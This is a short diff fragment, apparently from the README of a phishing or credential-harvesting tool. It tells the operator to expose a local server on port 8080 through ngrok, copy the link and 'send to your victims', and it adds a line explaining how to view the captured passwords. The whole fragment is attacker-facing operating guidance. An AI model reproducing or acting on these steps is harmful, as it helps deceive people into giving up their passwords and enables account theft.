@@ -31,3 +31,5 @@ type
 - $./ngrok http:8080
 
 # Then copy ngrok link and send to your victims...
+
+for view password ==> type $pw
